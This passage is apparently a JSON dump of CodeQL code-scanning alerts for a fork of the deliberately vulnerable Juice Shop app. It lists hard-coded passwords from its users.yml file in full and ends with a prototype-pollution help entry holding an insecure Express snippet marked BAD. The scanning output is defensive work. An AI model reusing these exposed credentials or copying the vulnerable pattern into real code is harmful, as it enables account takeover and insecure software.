'y&x5Z#f6W532ZUf$q3DsdgfgfgxxUsvoCUaDzFU' in configuration file."},"location":{"path":"data/static/users.yml","start_line":243,"end_line":243,"start_column":13,"end_column":54},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/110/instances"},{"number":109,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/109","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/109","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'y&x5Z#f6W532Z4445#Ae2HkwZVyDb7&oCUaDzFU' in configuration file."},"location":{"path":"data/static/users.yml","start_line":237,"end_line":237,"start_column":13,"end_column":54},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/109/instances"},{"number":108,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/108","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/108","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'demo' in configuration file."},"location":{"path":"data/static/users.yml","start_line":213,"end_line":213,"start_column":13,"end_column":19},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/108/instances"},{"number":107,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/107","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/107","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'muda-muda > ora-ora' in configuration file."},"location":{"path":"data/static/users.yml","start_line":204,"end_line":204,"start_column":13,"end_column":34},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/107/instances"},{"number":106,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/106","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/106","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'i am an awesome accountant' in configuration file."},"location":{"path":"data/static/users.yml","start_line":195,"end_line":195,"start_column":13,"end_column":41},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/106/instances"},{"number":105,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/105","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/105","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'uss enterprise' in configuration file."},"location":{"path":"data/static/users.yml","start_line":186,"end_line":186,"start_column":13,"end_column":29},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/105/instances"},{"number":104,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/104","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/104","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'K1f.....................' in configuration file."},"location":{"path":"data/static/users.yml","start_line":158,"end_line":158,"start_column":13,"end_column":39},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/104/instances"},{"number":103,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/103","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/103","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'EinBelegtesBrotMitSchinkenSCHINKEN!' in configuration file."},"location":{"path":"data/static/users.yml","start_line":149,"end_line":149,"start_column":13,"end_column":50},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/103/instances"},{"number":102,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/102","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/102","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password '0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB' in configuration file."},"location":{"path":"data/static/users.yml","start_line":140,"end_line":140,"start_column":13,"end_column":45},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/102/instances"},{"number":101,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/101","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/101","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'Mr. N00dles' in configuration file."},"location":{"path":"data/static/users.yml","start_line":132,"end_line":132,"start_column":13,"end_column":26},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/101/instances"},{"number":100,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/100","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/100","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'focusOnScienceMorty!focusOnScience' in configuration file."},"location":{"path":"data/static/users.yml","start_line":123,"end_line":123,"start_column":13,"end_column":49},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/100/instances"},{"number":99,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/99","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/99","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P' in configuration file."},"location":{"path":"data/static/users.yml","start_line":115,"end_line":115,"start_column":13,"end_column":45},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/99/instances"},{"number":98,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/98","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/98","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb' in configuration file."},"location":{"path":"data/static/users.yml","start_line":107,"end_line":107,"start_column":13,"end_column":75},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/98/instances"},{"number":97,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/97","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/97","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=' in configuration file."},"location":{"path":"data/static/users.yml","start_line":88,"end_line":88,"start_column":13,"end_column":51},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/97/instances"},{"number":96,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/96","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/96","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'OhG0dPlease1nsertLiquor!' in configuration file."},"location":{"path":"data/static/users.yml","start_line":63,"end_line":63,"start_column":13,"end_column":39},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/96/instances"},{"number":95,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/95","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/95","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'ncc-1701' in configuration file."},"location":{"path":"data/static/users.yml","start_line":31,"end_line":31,"start_column":13,"end_column":23},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/95/instances"},{"number":94,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/94","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/94","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/remote-property-injection","severity":"warning","description":"Remote property injection","name":"js/remote-property-injection","tags":["external/cwe/cwe-250","external/cwe/cwe-400","security"],"full_description":"Allowing writes to arbitrary properties of an object may lead to denial-of-service attacks.","help":"# Remote property injection\nDynamically computing object property names from untrusted input may have multiple undesired consequences. For example, if the property access is used as part of a write, an attacker may overwrite vital properties of objects, such as `__proto__`. This attack is known as *prototype pollution attack* and may serve as a vehicle for denial-of-service attacks. A similar attack vector, is to replace the `toString` property of an object with a primitive. Whenever `toString` is then called on that object, either explicitly or implicitly as part of a type coercion, an exception will be raised.\n\nMoreover, if the name of an HTTP header is user-controlled, an attacker may exploit this to overwrite security-critical headers such as `Access-Control-Allow-Origin` or `Content-Security-Policy`.\n\n\n## Recommendation\nThe most common case in which prototype pollution vulnerabilities arise is when JavaScript objects are used for implementing map data structures. This case should be avoided whenever possible by using the ECMAScript 2015 `Map` instead. When this is not possible, an alternative fix is to prepend untrusted input with a marker character such as `$`, before using it in properties accesses. In this way, the attacker does not have access to built-in properties which do not start with the chosen character.\n\nWhen using user input as part of a header name, a sanitization step should be performed on the input to ensure that the name does not clash with existing header names such as `Content-Security-Policy`.\n\n\n## Example\nIn the example below, the dynamically computed property `prop` is accessed on `myObj` using a user-controlled value.\n\n\n```javascript\nvar express = require('express');\n\nvar app = express();\nvar myObj = {}\n\napp.get('/user/:id', function(req, res) {\n\tvar prop = req.query.userControlled; // BAD\n\tmyObj[prop] = function() {};\n\tconsole.log(\"Request object \" + myObj);\n});\n```\nThis is not secure since an attacker may exploit this code to overwrite the property `__proto__` with an empty function. If this happens, the concatenation in the `console.log` argument will 